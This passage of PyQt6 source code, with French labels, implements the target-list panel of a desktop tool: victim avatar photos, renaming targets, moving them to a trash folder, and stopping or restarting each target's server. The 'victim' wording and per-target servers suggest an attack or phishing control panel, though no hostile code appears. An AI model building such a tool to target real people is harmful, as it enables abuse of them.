                row_lay.setSpacing(10)

                # Round avatar — left-click: change photo / right-click: context menu
                victim_photo = self._get_victim_photo(tid)
                avatar = self._make_round_avatar(victim_photo, size=44)
                avatar.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
                
                def _avatar_mouse(e, t=tid):
                    from PyQt6.QtCore import Qt as _Qt
                    if e.button() == _Qt.MouseButton.LeftButton:
                        self._pick_victim_photo(t)
                
                def _avatar_ctx_menu(pos, t=tid, av=avatar):
                    menu = QMenu(self)
                    menu.setStyleSheet("""
                        QMenu { background-color: #1E293B; border: 1px solid #475569; border-radius: 8px; padding: 4px; color: #E2E8F0; }
                        QMenu::item { padding: 8px 18px; border-radius: 4px; font-size: 13px; }
                        QMenu::item:selected { background-color: #334155; }
                    """)
                    act_change = menu.addAction("🖼️  Image victime")
                    act_change.triggered.connect(lambda: self._pick_victim_photo(t))
                    has_photo = bool(self._get_victim_photo(t))
                    if has_photo:
                        act_del = menu.addAction("🗑️  Supprimer la photo")
                        act_del.triggered.connect(lambda: (self._set_victim_photo(t, ""), self.refresh_targets_list(), self.main_win.rebuild_target_list() if hasattr(self.main_win, 'rebuild_target_list') else None))
                    menu.exec(av.mapToGlobal(pos))
                
                avatar.mousePressEvent = _avatar_mouse
                avatar.customContextMenuRequested.connect(_avatar_ctx_menu)
                row_lay.addWidget(avatar)

                lbl = QLabel(tid)
                from theme import get_theme as _gt3
                _t3 = _gt3()
                lbl.setStyleSheet(f"font-weight: bold; font-size: 13px; color: {_t3['text']}; background: transparent; border: none;")
                row_lay.addWidget(lbl, stretch=1)

                btn_config = BounceButton("⚙️")
                btn_config.setFixedSize(32, 28)
                from theme import btn_style_neutral as _bsn
                btn_config.setStyleSheet(_bsn())
                btn_config.clicked.connect(lambda checked, t=tid: self.load_target(t))
                row_lay.addWidget(btn_config)
            
                btn_del = BounceButton("🗑️")
                btn_del.setFixedSize(32, 28)
                btn_del.setToolTip("Mettre à la corbeille")
                from theme import btn_style_danger as _bsd
                btn_del.setStyleSheet(_bsd())
                btn_del.clicked.connect(lambda checked, t=tid: self.delete_target(t))
                row_lay.addWidget(btn_del)
            
                self.targets_layout.addWidget(row)
            self.targets_layout.addStretch()

        except Exception as e:
            log_error_to_file('Release.refresh_targets_list', e)
            log_error('Release.refresh_targets_list', e)
    def _show_target_context_menu(self, pos, tid, row_widget):
        try:
            menu = QMenu(self)
            menu.setStyleSheet("""
                QMenu { background-color: #1E293B; border: 1px solid #475569; border-radius: 8px; padding: 4px; color: #E2E8F0; }
                QMenu::item { padding: 8px 20px; border-radius: 4px; font-size: 13px; }
                QMenu::item:selected { background-color: #334155; }
            """)
            action_rename = menu.addAction("✏️  Renommer la cible")
            action_rename.triggered.connect(lambda: self.rename_target(tid))

            # Masquer / Afficher
            if is_target_hidden(tid):
                act_vis = menu.addAction("👁️  Afficher dans le dashboard")
                act_vis.triggered.connect(lambda: (set_target_hidden(tid, False),
                                                   self.main_win.rebuild_target_list() if hasattr(self.main_win, 'rebuild_target_list') else None))
            else:
                act_vis = menu.addAction("🙈  Masquer du dashboard")
                act_vis.triggered.connect(lambda: (set_target_hidden(tid, True),
                                                   self.main_win.rebuild_target_list() if hasattr(self.main_win, 'rebuild_target_list') else None))

            act_corbeille = menu.addAction("🗑️  Mettre à la corbeille")
            act_corbeille.triggered.connect(lambda: self.delete_target(tid))

            menu.exec(row_widget.mapToGlobal(pos))

        except Exception as e:
            log_error_to_file('Release._show_target_context_menu', e)
            log_error('Release._show_target_context_menu', e)
    def rename_target(self, old_tid):
        new_name, ok = QInputDialog.getText(
            self, "Renommer la cible",
            f"Nouveau nom pour '{old_tid}' :",
            text=old_tid
        )
        if not ok or not new_name.strip():
            return
        new_tid = new_name.strip()
        for char in '<>:"/\\|?*': new_tid = new_tid.replace(char, "_")
        if not new_tid or new_tid == old_tid:
            return
        new_path = os.path.join(TARGETS_DIR, f"{new_tid}.json")
        if os.path.exists(new_path):
            QMessageBox.warning(self, "Nom déjà pris", f"Une cible nommée '{new_tid}' existe déjà.")
            return
        try:
            from config import active_servers
            running_port = None
            running_cfg = None
            for port, cfg in list(active_servers.items()):
                if cfg.get("target_name") == old_tid:
                    running_port = port
                    running_cfg = cfg
                    break
            # Stop if running
            if running_port is not None and hasattr(self.main_win, 'stop_target'):
                self.main_win.stop_target(running_port)
                import time; time.sleep(0.2)
            # Rename the JSON file
            old_path = os.path.join(TARGETS_DIR, f"{old_tid}.json")
            import json
            with open(old_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            data['target_name'] = new_tid
            with open(new_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
            os.remove(old_path)
            # Rename video sandbox folder if it exists
            from config import VIDEOS_DIR
            old_vid = os.path.join(VIDEOS_DIR, old_tid)
            new_vid = os.path.join(VIDEOS_DIR, new_tid)
            if os.path.exists(old_vid) and not os.path.exists(new_vid):
                import shutil
                shutil.move(old_vid, new_vid)
            # Close open config window for old tid
            if old_tid in self.main_win.victim_windows:
                self.main_win.victim_windows[old_tid].close()
            # Sync metadata (hidden flag) to the new tid
            rename_target_meta(old_tid, new_tid)
            # Refresh UI
            self.refresh_targets_list()
            if hasattr(self.main_win, 'rebuild_target_list'):
                self.main_win.rebuild_target_list()
            # Restart if was running
            if running_port is not None:
                QTimer.singleShot(300, lambda: self.main_win.start_target(new_tid))
        except Exception as e:
            log_error_to_file("ConfigWindow.rename_target", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors du renommage : {e}")

    def delete_target(self, tid):
        button_id = f"delete_{tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        msg = QMessageBox(self)
        msg.setWindowTitle("Mettre à la corbeille")
        msg.setText(f"Mettre '{tid}' à la corbeille ?")
        msg.setInformativeText("La cible sera déplacée dans la corbeille. Vous pourrez la restaurer ou la supprimer définitivement depuis la corbeille.")
        msg.setIcon(QMessageBox.Icon.Question)
        msg.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg.setDefaultButton(QMessageBox.StandardButton.Yes)
        msg.button(QMessageBox.StandardButton.Yes).setText("Oui, mettre à la corbeille")
        msg.button(QMessageBox.StandardButton.No).setText("Annuler")
        from theme import get_theme as _gt_del
        _t_del = _gt_del()
        msg.setStyleSheet(f"""
            QMessageBox {{ background-color: {_t_del['bg']}; color: {_t_del['text']}; }}
            QLabel {{ color: {_t_del['text']}; font-size: 13px; }}
            QPushButton {{ background-color: {_t_del['bg_alt']}; color: {_t_del['text']}; border: 1px solid {_t_del['border_hover']}; padding: 8px 16px; border-radius: 6px; font-weight: normal; }}
            QPushButton:hover {{ background-color: {_t_del['border_hover']}; border-color: {_t_del['accent']}; color: {_t_del['accent_text']}; }}
        """)
        
        if msg.exec() == QMessageBox.StandardButton.Yes:
            button_manager.lock_button(button_id)
            try:
                # Auto-stop the target if it's currently running
                from config import active_servers
                running_port = None
                for port, cfg in list(active_servers.items()):
                    if cfg.get("target_name") == tid:
                        running_port = port
                        break
                if running_port is not None and hasattr(self.main_win, 'stop_target'):
                    self.main_win.stop_target(running_port)
                
                # Move the JSON file to the trash directory
                src_path = os.path.join(TARGETS_DIR, f"{tid}.json")
                dst_path = os.path.join(TRASH_DIR, f"{tid}.json")
                # If a target with the same name already exists in trash, overwrite it
                if os.path.exists(dst_path):
                    os.remove(dst_path)
                if os.path.exists(src_path):
                    # Use rename for atomic move on same filesystem
                    os.rename(src_path, dst_path)
                
                if hasattr(self.main_win, 'selected_tid') and self.main_win.selected_tid == tid:
                    self.main_win.selected_tid = None
                # Fermer la fenêtre de configuration de la cible si elle est ouverte
                if tid in self.main_win.victim_windows:
                    self.main_win.victim_windows[tid].close()
                # Actualiser la liste dans ConfigWindow
                self.refresh_targets_list()
                self.update()
                # Actualiser la liste dans la fenêtre principale
                if hasattr(self.main_win, 'rebuild_target_list'):
                    self.main_win.rebuild_target_list()
                    self.main_win.update()
                # Actualiser le ComboBox du SandboxWindow si ouvert
                if hasattr(self.main_win, 'sandbox_win'):
                    if self.main_win.sandbox_win and self.main_win.sandbox_win.isVisible():
                        self.main_win.sandbox_win.refresh_targets()
                        self.main_win.sandbox_win.update()
            except Exception as e:
                log_error_to_file("ConfigWindow.delete_target", e)
                log_error("ConfigWindow.delete_target", e)
            finally:
                button_manager.unlock_button(button_id)

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        # Rafraîchir la liste à chaque affichage
        self.refresh_targets_list()
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(400)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.start()
        super().showEvent(event)

    def closeEvent(self, event):
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(300)
        self.animation.setStartValue(1.0)
        self.animation.setEndValue(0.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.finished.connect(self.hide)
        self.animation.start()
        event.ignore()
